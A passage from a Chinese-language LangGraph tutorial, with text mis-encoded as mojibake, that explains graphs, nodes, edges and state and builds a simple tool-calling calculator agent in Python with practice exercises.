<li>è¯´æ¸…<strong>LangGraph</strong>çš„åŸºæœ¬æ¦‚å¿µï¼šå›¾ã€èŠ‚ç‚¹ã€è¾¹ã€çŠ¶æ€ã€‚</li>
<li>ç”¨<strong>Graph API</strong>ä»é›¶æ„å»ºä¸€ä¸ªå¸¦å·¥å…·è°ƒç”¨çš„æœ‰çŠ¶æ€è®¡ç®—å™¨æ™ºèƒ½ä½“ã€‚</li>
<li>çœ‹æ‡‚<strong>START / END / æ¡ä»¶è¾¹</strong>åœ¨å·¥ä½œæµä¸­çš„ä½œç”¨ï¼Œå¹¶èƒ½æœ¬åœ°è¿è¡Œä¸€ä¸ªå®Œæ•´ç¤ºä¾‹ã€‚</li>
</ul>
<p>è¿è¡Œç¯å¢ƒä¸ç‰ˆæœ¬ï¼š</p>
<ul>
<li><strong>Python 3.10+</strong></li>
<li>æ¨èï¼š<code>pip install -U langgraph langchain-core</code>ï¼ˆæœ¬æ–‡ç¤ºä¾‹åŸºäº <strong>LangGraph / LangChain v0.2+</strong>ï¼Œæ¶ˆæ¯ç±»å‹ä»<code>langchain_core.messages</code>å¯¼å…¥ï¼‰</li>
<li>å¯é€‰ï¼š<code>pip install ipython</code>ç”¨äºå¯è§†åŒ–ã€‚æ¨¡å‹é»˜è®¤ä½¿ç”¨<strong>DeepSeek</strong>ï¼Œä¹Ÿå¯ä»¥æ›¿æ¢ä¸º OpenAI / æœ¬åœ°æ¨¡å‹ï¼Œéœ€è‡ªè¡Œå‡†å¤‡ API Keyã€‚</li>
</ul>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flangchain-ai.github.io%2Flanggraph%2F" target="_blank" title="https://langchain-ai.github.io/langgraph/" ref="nofollow noopener noreferrer">langchain-ai.github.io/langgraph/</a></p>
<h3 data-id="heading-2">1.2 ç®€å•ç¤ºä¾‹</h3>
<p>é¦–å…ˆå®‰è£… LangGraphï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install -U langgraph
<span class="hljs-comment"># Requires Python 3.10+</span>
</code></pre>
<p>åˆ›å»ºä¸€ä¸ªç®€å•çš„â€œHello Worldâ€ç¤ºä¾‹ï¼ˆå¯ç›´æ¥è¿è¡Œï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, MessagesState, START, END

<span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_llm</span>(<span class="hljs-params">state: MessagesState</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"ai"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"hello world"</span>}]}

graph = StateGraph(MessagesState)
graph.add_node(<span class="hljs-string">"mock_llm"</span>, mock_llm)
graph.add_edge(START, <span class="hljs-string">"mock_llm"</span>)
graph.add_edge(<span class="hljs-string">"mock_llm"</span>, END)
graph = graph.<span class="hljs-built_in">compile</span>()

graph.invoke({<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"hi!"</span>}]})
</code></pre>
<h3 data-id="heading-3">1.3 æ ¸å¿ƒæ¦‚å¿µï¼šå›¾ã€èŠ‚ç‚¹ã€è¾¹ã€çŠ¶æ€</h3>
<p><strong>å›¾ç»“æ„ï¼ˆGraph Structureï¼‰</strong></p>
<p>LangGraph å°†åº”ç”¨é€»è¾‘ç»„ç»‡æˆä¸€ä¸ªæœ‰å‘å›¾ï¼Œå…¶ä¸­ï¼š</p>
<ul>
<li>èŠ‚ç‚¹ï¼ˆNodesï¼‰ï¼šä»£è¡¨å…·ä½“çš„æ“ä½œæˆ–è®¡ç®—æ­¥éª¤ï¼Œå¯ä»¥æ˜¯è°ƒç”¨è¯­è¨€æ¨¡å‹ã€æ‰§è¡Œå‡½æ•°æˆ–ä¸å¤–éƒ¨å·¥å…·äº¤äº’ç­‰</li>
<li>è¾¹ï¼ˆEdgesï¼‰ï¼šå®šä¹‰èŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥å’Œæ‰§è¡Œé¡ºåºï¼Œæ”¯æŒæ™®é€šè¾¹ï¼ˆç›´æ¥è¿æ¥ï¼‰å’Œæ¡ä»¶è¾¹ï¼ˆåŸºäºæ¡ä»¶åŠ¨æ€é€‰æ‹©ä¸‹ä¸€æ­¥ï¼‰</li>
</ul>
<p><strong>çŠ¶æ€ç®¡ç†ï¼ˆState Managementï¼‰</strong></p>
<p>LangGraph çš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯è‡ªåŠ¨ç»´æŠ¤å’Œç®¡ç†çŠ¶æ€</p>
<p>çŠ¶æ€ï¼ˆStateï¼‰æ˜¯ä¸€ä¸ªè´¯ç©¿æ•´ä¸ªå›¾çš„å…±äº«æ•°æ®ç»“æ„ï¼Œè®°å½•äº†åº”ç”¨è¿è¡Œè¿‡ç¨‹ä¸­çš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p>
<p>æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥æ ¹æ®å½“å‰çŠ¶æ€æ‰§è¡Œä»»åŠ¡å¹¶æ›´æ–°çŠ¶æ€ï¼Œç¡®ä¿ç³»ç»Ÿåœ¨å¤šæ­¥éª¤æˆ–å¤šä¸»ä½“äº¤äº’ä¸­ä¿æŒä¸€è‡´æ€§</p>
<p><strong>å¾ªç¯èƒ½åŠ›ï¼ˆCyclical Workflowsï¼‰</strong></p>
<p>ä¸ä¼ ç»Ÿçš„çº¿æ€§å·¥ä½œæµï¼ˆå¦‚ LangChain çš„ LCELï¼‰ä¸åŒï¼ŒLangGraph æ”¯æŒå¾ªç¯é€»è¾‘ï¼Œè¿™ä½¿å¾—å®ƒéå¸¸é€‚åˆéœ€è¦åå¤æ¨ç†ã€å†³ç­–æˆ–ä¸ç”¨æˆ·äº¤äº’çš„ä»£ç†åº”ç”¨ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªä»£ç†å¯ä»¥åœ¨å¾ªç¯ä¸­ä¸æ–­è°ƒç”¨è¯­è¨€æ¨¡å‹ï¼Œç›´åˆ°è¾¾æˆç›®æ ‡ã€‚</p>
<h3 data-id="heading-4">1.4 æ ¸å¿ƒä¼˜åŠ¿</h3>
<p>**æŒä¹…æ‰§è¡Œï¼š**å†…ç½®æ”¯æŒçŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤ï¼Œä¾¿äºé”™è¯¯æ¢å¤å’Œé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡</p>
<p>**äººæœºäº¤äº’ï¼š**æ”¯æŒâ€œäººåœ¨å›è·¯â€ï¼ˆhuman-in-the-loopï¼‰åŠŸèƒ½ï¼Œè®©äººç±»åœ¨å…³é”®æ­¥éª¤å‚ä¸å†³ç­–</p>
<p><strong>ç»¼åˆè®°å¿†</strong>ï¼šåˆ›å»ºæœ‰çŠ¶æ€çš„æ™ºèƒ½ä½“ï¼Œæ—¢æœ‰ç”¨äºæŒç»­æ¨ç†çš„çŸ­æœŸè®°å¿†ï¼Œåˆå…·æœ‰è·¨ä¼šè¯çš„é•¿æœŸè®°å¿†ã€‚</p>
<p><strong>LangSmithè°ƒè¯•</strong>ï¼šå¯è§†åŒ–è·Ÿè¸ªæ‰§è¡Œè·¯å¾„ã€æ•è·çŠ¶æ€è½¬æ¢å¹¶æä¾›è¯¦ç»†çš„è¿è¡Œæ—¶æŒ‡æ ‡ã€‚</p>
<p>**çµæ´»æ€§ï¼š**å¼€å‘è€…å¯ä»¥ç²¾ç»†æ§åˆ¶å·¥ä½œæµçš„é€»è¾‘å’ŒçŠ¶æ€æ›´æ–°ï¼Œé€‚åº”å¤æ‚çš„ä¸šåŠ¡éœ€æ±‚</p>
<p>**å¤šä¸»ä½“åä½œï¼š**å…è®¸å¤šä¸ªä»£ç†ååŒå·¥ä½œï¼Œæ¯ä¸ªä»£ç†è´Ÿè´£ç‰¹å®šä»»åŠ¡ï¼Œé€šè¿‡å›¾ç»“æ„åè°ƒäº¤äº’</p>
<h3 data-id="heading-5">1.5 ä½¿ç”¨åœºæ™¯</h3>
<p>LangGraph ç‰¹åˆ«é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<p>**å¯¹è¯ä»£ç†ï¼š**æ„å»ºèƒ½å¤Ÿè®°ä½ä¸Šä¸‹æ–‡ã€åŠ¨æ€è°ƒæ•´ç­–ç•¥çš„æ™ºèƒ½èŠå¤©æœºå™¨äºº</p>
<p>**å¤šæ­¥éª¤ä»»åŠ¡ï¼š**å¤„ç†éœ€è¦åˆ†è§£ä¸ºå¤šä¸ªé˜¶æ®µçš„å¤æ‚é—®é¢˜ï¼Œå¦‚ç ”ç©¶ã€å†™ä½œæˆ–æ•°æ®åˆ†æ</p>
<p>**å¤šä»£ç†ç³»ç»Ÿï¼š**åè°ƒå¤šä¸ªä»£ç†åˆ†å·¥åˆä½œï¼Œæ¯”å¦‚ä¸€ä¸ªè´Ÿè´£æœç´¢ä¿¡æ¯ã€å¦ä¸€ä¸ªè´Ÿè´£æ€»ç»“å†…å®¹çš„ç³»ç»Ÿ</p>
<h3 data-id="heading-6">1.6 ä¸ LangChain çš„å…³ç³»</h3>
<ul>
<li>LangGraph æ˜¯ LangChain ç”Ÿæ€çš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒæ˜¯ç‹¬ç«‹äº LangChain çš„ä¸€ä¸ªæ¨¡å—</li>
<li>LangChain æ›´æ“…é•¿å¤„ç†ç®€å•çš„çº¿æ€§ä»»åŠ¡é“¾ï¼ˆDAGï¼‰ï¼Œè€Œ LangGraph ä¸“æ³¨äºæ›´å¤æ‚çš„å¾ªç¯å’Œå¤šä¸»ä½“åœºæ™¯</li>
<li>ä½ å¯ä»¥å•ç‹¬ä½¿ç”¨ LangGraphï¼Œä¹Ÿå¯ä»¥ç»“åˆ LangChain çš„ç»„ä»¶ï¼ˆå¦‚æç¤ºæ¨¡æ¿ã€å·¥å…·æ¥å£ï¼‰æ¥å¢å¼ºåŠŸèƒ½</li>
</ul>
<h2 data-id="heading-7">2. å¿«é€Ÿå…¥é—¨</h2>
<p>æœ¬å¿«é€Ÿå…¥é—¨æŒ‡å—æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨<strong>LangGraph Graph API</strong>æ„å»ºä¸€ä¸ªâ€œä¼šç®—æ•°â€çš„ç®€å•æ™ºèƒ½ä½“ã€‚
å‰ç½®å‡†å¤‡ï¼šPython 3.10+ï¼›<code>pip install -U langgraph langchain-core</code>ï¼Œå¯é€‰<code>pip install ipython</code>ç”¨äºå¯è§†åŒ–ã€‚ç¤ºä¾‹é»˜è®¤ä½¿ç”¨ DeepSeek æ¨¡å‹ï¼Œå¦‚æœªé…ç½®å¯æ›¿æ¢ä¸ºæœ¬åœ°/å¼€æºæ¨¡å‹å¹¶è°ƒæ•´<code>init_chat_model</code>ã€‚</p>
<p>æœ¬ç¤ºä¾‹ä¸­å°†æ™ºèƒ½ä½“å®šä¹‰ä¸ºç”±èŠ‚ç‚¹å’Œè¾¹ç»„æˆçš„å›¾ï¼Œä½¿ç”¨<strong>Graph API</strong>æ¥é©±åŠ¨æ‰§è¡Œã€‚</p>
<h3 data-id="heading-8">2.1 å®šä¹‰ tools å’Œ model</h3>
<p>æˆ‘ä»¬å°†ä½¿ç”¨ DeepSeek æ¨¡å‹ï¼Œå¹¶å®šä¹‰åŠ æ³•ã€ä¹˜æ³•å’Œé™¤æ³•å·¥å…·ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langchain.chat_models <span class="hljs-keyword">import</span> init_chat_model

model = init_chat_model(
    model=<span class="hljs-string">"deepseek-chat"</span>, 
    model_provider=<span class="hljs-string">"deepseek"</span>
)

<span class="hljs-comment"># Define tools</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""Multiply `a` and `b`.

    Args:
        a: First int
        b: Second int
    """</span>
    <span class="hljs-keyword">return</span> a * b


<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""Adds `a` and `b`.

    Args:
        a: First int
        b: Second int
    """</span>
    <span class="hljs-keyword">return</span> a + b


<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""Divide `a` and `b`.

    Args:
        a: First int
        b: Second int
    """</span>
    <span class="hljs-keyword">return</span> a / b


<span class="hljs-comment"># Augment the LLM with tools</span>
tools = [add, multiply, divide]
tools_by_name = {tool.name: tool <span class="hljs-keyword">for</span> tool <span class="hljs-keyword">in</span> tools}
model_with_tools = model.bind_tools(tools)
</code></pre>
<blockquote>
<p>å°æ£€æŸ¥ï¼šæ­¤æ—¶ä½ å¯ä»¥åœ¨ Python é‡Œç›´æ¥è°ƒç”¨add(3, 4)ã€multiply(2, 5)ï¼Œç¡®è®¤å·¥å…·å‡½æ•°æœ¬èº«å·¥ä½œæ­£å¸¸ï¼Œå†ç»§ç»­åé¢çš„å›¾æ„å»ºã€‚</p>
</blockquote>
<h3 data-id="heading-9">2.2 å®šä¹‰ Stateï¼ˆçŠ¶æ€ï¼‰</h3>
<p>å›¾çš„çŠ¶æ€ç”¨äºå­˜å‚¨æ¶ˆæ¯å’Œ LLM è°ƒç”¨æ¬¡æ•°ã€‚</p>
<blockquote>
<p>LangGraph ä¸­çš„çŠ¶æ€åœ¨æ™ºèƒ½ä½“æ‰§è¡Œè¿‡ç¨‹ä¸­å§‹ç»ˆå­˜åœ¨ã€‚</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> AnyMessage
<span class="hljs-keyword">from</span> typing_extensions <span class="hljs-keyword">import</span> TypedDict, Annotated
<span class="hljs-keyword">import</span> operator

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MessagesState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    messages: Annotated[<span class="hljs-built_in">list</span>[AnyMessage], operator.add]
    llm_calls: <span class="hljs-built_in">int</span>
</code></pre>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p>
<ul>
<li><code>messages</code>ï¼šå¯¹è¯å†å²ï¼Œæ˜¯ä¸€ä¸ªâ€œä¸æ–­è¿½åŠ â€çš„åˆ—è¡¨ï¼›<code>Annotated[..., operator.add]</code>å‘Šè¯‰ LangGraph åœ¨æ¯ä¸ªèŠ‚ç‚¹æ‰§è¡Œå®Œåï¼ŒæŠŠæ–°æ¶ˆæ¯è¿½åŠ åˆ°æ—§æ¶ˆæ¯åé¢ï¼Œè€Œä¸æ˜¯æ•´æ®µæ›¿æ¢ã€‚</li>
<li><code>llm_calls</code>ï¼šæˆ‘ä»¬è‡ªå·±åŠ çš„ä¸€ä¸ªâ€œè®¡æ•°å™¨å­—æ®µâ€ï¼Œç”¨æ¥è®°å½•å½“å‰è¿™æ¡å¯¹è¯ä¸­ LLM è¢«è°ƒç”¨äº†å¤šå°‘æ¬¡ï¼Œè¯´æ˜çŠ¶æ€ä¸ä»…èƒ½å­˜æ¶ˆæ¯ï¼Œè¿˜èƒ½å­˜ä»»æ„ä¸šåŠ¡ç›¸å…³ä¿¡æ¯ã€‚</li>
</ul>
<h3 data-id="heading-10">2.3 å®šä¹‰æ¨¡å‹èŠ‚ç‚¹ï¼ˆllm_callï¼‰</h3>
<p>æ¨¡å‹èŠ‚ç‚¹<code>llm_call</code>ç”¨äºè°ƒç”¨ LLMï¼Œå¹¶æ ¹æ®å¯¹è¯å†…å®¹å†³å®šæ˜¯å¦è°ƒç”¨å·¥å…·ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> SystemMessage

<span class="hljs-keyword">def</span> <span class="hljs-title function_">llm_call</span>(<span class="hljs-params">state: <span class="hljs-built_in">dict</span></span>):
    <span class="hljs-string">"""LLM decides whether to call a tool or not"""</span>

    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"messages"</span>: [
            model_with_tools.invoke(
                [
                    SystemMessage(
                        content=<span class="hljs-string">"You are a helpful assistant tasked with performing arithmetic on a set of inputs."</span>
                    )
                ]
                + state[<span class="hljs-string">"messages"</span>]
            )
        ],
        <span class="hljs-string">"llm_calls"</span>: state.get(<span class="hljs-string">'llm_calls'</span>, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>
    }
</code></pre>
<blockquote>
<p>å°æ£€æŸ¥ï¼šä½ å¯ä»¥ä¸´æ—¶æ„é€ ä¸€ä¸ªç®€å•çš„state = {"messages": [], "llm_calls": 0}å¹¶è°ƒç”¨ä¸€æ¬¡llm_call(state)ï¼Œç¡®è®¤ä¸ä¼šæŠ¥é”™ï¼Œå¸®åŠ©ä½ åœ¨çœŸæ­£æ¥å…¥å›¾ä¹‹å‰å…ˆéªŒè¯å¥½è¿™ä¸€èŠ‚ç‚¹çš„é€»è¾‘ã€‚</p>
</blockquote>
<h3 data-id="heading-11">2.4 å®šä¹‰å·¥å…·èŠ‚ç‚¹ï¼ˆtool_nodeï¼‰</h3>
<p>å·¥å…·èŠ‚ç‚¹<code>tool_node</code>ç”¨äºçœŸæ­£æ‰§è¡Œå·¥å…·è°ƒç”¨å¹¶è¿”å›ç»“æœã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> ToolMessage , HumanMessage


<span class="hljs-keyword">def</span> <span class="hljs-title function_">tool_node</span>(<span class="hljs-params">state: <span class="hljs-built_in">dict</span></span>):
    <span class="hljs-string">"""Performs the tool call"""</span>

    result = []
    <span class="hljs-keyword">for</span> tool_call <span class="hljs-keyword">in</span> state[<span class="hljs-string">"messages"</span>][-<span class="hljs-number">1</span>].tool_calls:
        tool = tools_by_name[tool_call[<span class="hljs-string">"name"</span>]]
        observation = tool.invoke(tool_call[<span class="hljs-string">"args"</span>])
        result.append(ToolMessage(content=observation, tool_call_id=tool_call[<span class="hljs-string">"id"</span>]))
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"messages"</span>: result}
</code></pre>
<h3 data-id="heading-12">2.5 å®šä¹‰ç»“æŸé€»è¾‘ï¼ˆshould_continueï¼‰</h3>
<p>æ¡ä»¶è¾¹å‡½æ•°ç”¨äºæ ¹æ® LLM æ˜¯å¦å‘å‡ºå·¥å…·è°ƒç”¨æ¥è·¯ç”±åˆ°å·¥å…·èŠ‚ç‚¹æˆ–ç»ˆç‚¹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Literal</span>
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, START, END


<span class="hljs-keyword">def</span> <span class="hljs-title function_">should_continue</span>(<span class="hljs-params">state: MessagesState</span>) -&gt; <span class="hljs-type">Literal</span>[<span class="hljs-string">"tool_node"</span>, END]:
    <span class="hljs-string">"""Decide if we should continue the loop or stop based upon whether the LLM made a tool call"""</span>

    messages = state[<span class="hljs-string">"messages"</span>]
    last_message = messages[-<span class="hljs-number">1</span>]

    <span class="hljs-comment"># If the LLM makes a tool call, then perform an action</span>
    <span class="hljs-keyword">if</span> last_message.tool_calls:
        <span class="hljs-keyword">return</span><span class="hljs-string">"tool_node"</span>

    <span class="hljs-comment"># Otherwise, we stop (reply to the user)</span>
    <span class="hljs-keyword">return</span> END
</code></pre>
<blockquote>
<p>è¡¥å……è¯´æ˜ï¼šSTARTï¼šå›¾çš„å…¥å£ï¼Œé¦–æ¬¡è°ƒç”¨ä»è¿™é‡Œå¼€å§‹ã€‚ENDï¼šå›¾çš„å‡ºå£ï¼Œä¸€æ—¦è·¯ç”±åˆ°è¿™é‡Œï¼Œæœ¬æ¬¡æ‰§è¡Œå°±ç»“æŸï¼Œç»“æœè¿”å›ç»™è°ƒç”¨æ–¹ã€‚should_continueï¼šå°±æ˜¯â€œè·¯ç”±è§„åˆ™å‡½æ•°â€ï¼Œæ ¹æ®æœ€åä¸€æ¡æ¶ˆæ¯æ˜¯å¦åŒ…å«å·¥å…·è°ƒç”¨ï¼Œå†³å®šä¸‹ä¸€æ­¥æ˜¯ç»§ç»­èµ°tool_nodeï¼Œè¿˜æ˜¯ç›´æ¥ç»“æŸã€‚</p>
</blockquote>
<h3 data-id="heading-13">2.6 æ„å»ºå¹¶ç¼–è¯‘ä»£ç†ç¨‹åº</h3>
<p>ä½¿ç”¨<code>StateGraph</code>æ„å»ºå·¥ä½œæµå›¾ï¼Œå¹¶é€šè¿‡<code>compile()</code>æ–¹æ³•è¿›è¡Œç¼–è¯‘ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Build workflow</span>
agent_builder = StateGraph(MessagesState)

<span class="hljs-comment"># Add nodes</span>
agent_builder.add_node(<span class="hljs-string">"llm_call"</span>, llm_call)
agent_builder.add_node(<span class="hljs-string">"tool_node"</span>, tool_node)

<span class="hljs-comment"># Add edges to connect nodes</span>
agent_builder.add_edge(START, <span class="hljs-string">"llm_call"</span>)
agent_builder.add_conditional_edges(
    <span class="hljs-string">"llm_call"</span>,
    should_continue,
    [<span class="hljs-string">"tool_node"</span>, END]
)
agent_builder.add_edge(<span class="hljs-string">"tool_node"</span>, <span class="hljs-string">"llm_call"</span>)

<span class="hljs-comment"># Compile the agent</span>
agent = agent_builder.<span class="hljs-built_in">compile</span>()

<span class="hljs-comment"># Show the agent</span>
<span class="hljs-keyword">from</span> IPython.display <span class="hljs-keyword">import</span> Image, display
display(Image(agent.get_graph(xray=<span class="hljs-literal">True</span>).draw_mermaid_png()))
</code></pre>
<p>æ­å–œï¼æ‚¨å·²ä½¿ç”¨ LangGraph Graph API æ„å»ºäº†æ‚¨çš„ç¬¬ä¸€ä¸ªæ™ºèƒ½ä½“ã€‚</p>
<h2 data-id="heading-14">è¿è¡Œæœ¬åœ°æœåŠ¡</h2>
<p>æœ€åï¼Œæˆ‘ä»¬æŠŠä¸Šé¢çš„å·¥ä½œæµå°è£…åˆ°ä¸€ä¸ª<code>main()</code>å‡½æ•°é‡Œï¼Œä¾¿äºç›´æ¥é€šè¿‡<code>python quickstart.py</code>è¿è¡Œæ•´ä¸ªç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-string">"""è„šæœ¬å…¥å£ï¼šæ„å»ºå›¾ã€å¯é€‰åœ°å±•ç¤ºç»“æ„ï¼Œå¹¶æ‰§è¡Œä¸€æ¬¡ç¤ºä¾‹è°ƒç”¨ã€‚"""</span>
    <span class="hljs-comment"># å¯é€‰ï¼šå°è¯•å±•ç¤ºå·¥ä½œæµå›¾ç»“æ„ï¼ˆç»ˆç«¯ç¯å¢ƒä¸‹å¤±è´¥ä¼šè‡ªåŠ¨å¿½ç•¥ï¼‰</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">from</span> IPython.display <span class="hljs-keyword">import</span> Image, display  <span class="hljs-comment"># å»¶è¿Ÿå¯¼å…¥ï¼Œé¿å…ç¼ºå°‘ IPython æ—¶ç›´æ¥æŠ¥é”™</span>
        img_bytes = agent.get_graph(xray=<span class="hljs-literal">True</span>).draw_mermaid_png()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[info] å·²ç”Ÿæˆå·¥ä½œæµå›¾åƒï¼ˆå­—èŠ‚æ•°: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(img_bytes)}</span>ï¼‰ï¼Œåœ¨ Notebook ä¸­å¯ç›´æ¥ displayã€‚"</span>)
        <span class="hljs-comment"># åœ¨çº¯è„šæœ¬ç¯å¢ƒä¸­ç›´æ¥ display(Image(...)) ä¸€èˆ¬ä¸ä¼šæœ‰å¯è§†åŒ–æ•ˆæœï¼Œè¿™é‡Œä»…æç¤ºç”¨æˆ·</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[warn] è·³è¿‡å›¾åƒå±•ç¤ºï¼ˆå¯èƒ½æœªå®‰è£… IPython æˆ–å½“å‰ç¯å¢ƒä¸æ”¯æŒå›¾åƒæ˜¾ç¤ºï¼‰ï¼š<span class="hljs-subst">{e}</span>"</span>)

    <span class="hljs-comment"># æ‰§è¡Œä¸€æ¬¡ç¤ºä¾‹è°ƒç”¨</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n[info] å¼€å§‹æ‰§è¡Œç¤ºä¾‹ï¼š'Add 3 and 4.'\n"</span>)
    messages = [HumanMessage(content=<span class="hljs-string">"Add 3 and 4."</span>)]
    result = agent.invoke({<span class="hljs-string">"messages"</span>: messages})
    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result[<span class="hljs-string">"messages"</span>]:
        m.pretty_print()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<p>æ‰§è¡Œç»“æœï¼ˆé¢„æœŸï¼‰ï¼š</p>
<ul>
<li>æ§åˆ¶å°æç¤ºç”Ÿæˆå·¥ä½œæµå›¾ï¼ˆçº¯ç»ˆç«¯å¯å¿½ç•¥ï¼‰ã€‚</li>
<li>ç¤ºä¾‹è°ƒç”¨ â€œAdd 3 and 4.â€ï¼Œè¿”å›å·¥å…·è°ƒç”¨<code>add(3,4)</code>ï¼Œæœ€ç»ˆå›ç­” â€œThe sum of 3 and 4 is 7ã€‚â€</li>
</ul>
<h3 data-id="heading-15">2.7 ç»ƒä¹ ä¸æ‰©å±•</h3>
<p>å»ºè®®ä½ åœ¨æœ¬è®²ç»“æŸåå°è¯•å®Œæˆä»¥ä¸‹å°ç»ƒä¹ ï¼ŒåŠ æ·±ç†è§£ï¼š</p>
<ul>
<li><strong>ç»ƒä¹  1ï¼šæ–°å¢ä¸€ä¸ªå‡æ³•å·¥å…·</strong>
ä»¿ç…§<code>add</code>/<code>multiply</code>å®šä¹‰<code>subtract(a: int, b: int) -&gt; int</code>ï¼Œå¹¶è®© LLM åœ¨éœ€è¦åšå‡æ³•æ—¶è‡ªåŠ¨é€‰æ‹©è¿™ä¸ªå·¥å…·ã€‚</li>
<li><strong>ç»ƒä¹  2ï¼šä¿®æ”¹ç³»ç»Ÿæç¤ºè¯­</strong>
æŠŠ<code>SystemMessage</code>çš„å†…å®¹æ”¹æˆâ€œå¦‚é‡åˆ°é™¤é›¶ï¼Œè¯·è§£é‡Šé”™è¯¯è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨å·¥å…·â€ï¼Œè§‚å¯Ÿ LLM åœ¨è¾“å…¥ â€œdivide 3 by 0â€ æ—¶çš„è¡Œä¸ºæ˜¯å¦ç¬¦åˆé¢„æœŸã€‚</li>
<li><strong>ç»ƒä¹  3ï¼šæ‰“å° LLM è°ƒç”¨æ¬¡æ•°</strong>
åœ¨<code>main()</code>ä¸­æ‰“å°<code>result["llm_calls"]</code>ï¼Œçœ‹çœ‹ä¸€æ¬¡ç®€å•è¯·æ±‚ä¸­ LLM è¢«è°ƒç”¨äº†å¤šå°‘æ¬¡ï¼Œä»è€Œç†è§£â€œå¾ªç¯ + å·¥å…·è°ƒç”¨â€çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</li>
</ul>
<blockquote>
<p>å°æç¤ºï¼šå¦‚æœä½ æŠŠè¿™ä¸‰ä¸ªç»ƒä¹ éƒ½å®Œæˆäº†ï¼Œè¯´æ˜è¿™ä¸€è®²ä½ å·²ç»ä¸ä»…â€œçœ‹æ‡‚äº†ä»£ç â€ï¼Œè€Œä¸”çœŸæ­£æŒæ¡äº† LangGraph çš„åŸºç¡€ç”¨æ³•ï¼Œå¯ä»¥å®‰å¿ƒè¿›å…¥ä¸‹ä¸€è®²çš„ Memory ä¸“é¢˜ã€‚</p>
</blockquote>
<h2 data-id="heading-16">å°ç»“ä¸ä¸‹ä¸€è®²é¢„å‘Š</h2>
<p>æœ¬è®²å®Œæˆäº†ï¼š</p>
<ul>
<li>è®¤è¯† LangGraph çš„æ ¸å¿ƒï¼šèŠ‚ç‚¹ã€è¾¹ã€çŠ¶æ€ï¼Œç”¨ Graph API æ„å»ºå¯å¾ªç¯çš„æœ‰çŠ¶æ€è®¡ç®—å™¨æ™ºèƒ½ä½“ã€‚</li>
<li>ç†è§£å·¥å…·è°ƒç”¨åœ¨å›¾ä¸­çš„ä½ç½®ï¼šLLM èŠ‚ç‚¹å†³å®šæ˜¯å¦è°ƒç”¨å·¥å…·ï¼Œå·¥å…·èŠ‚ç‚¹æ‰§è¡Œåå†å›åˆ° LLMã€‚</li>
